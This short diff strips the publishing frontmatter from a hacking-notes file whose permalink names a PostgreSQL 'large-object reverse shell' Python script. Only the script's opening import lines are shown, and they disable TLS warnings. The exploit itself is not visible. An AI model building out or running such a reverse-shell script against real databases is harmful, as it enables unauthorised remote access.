@@ -1,23 +1,3 @@
----
-{"dg-publish":true,"permalink":"/1-hack-like-a-script-kiddie/web/postgres-sql/large-object-reverse-shell-python-code/","noteIcon":"","created":"2025-04-15T14:11:19.610-04:00"}
----
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 ```python
 import requests, sys, urllib, string, random, time
 requests.packages.urllib3.disable_warnings()
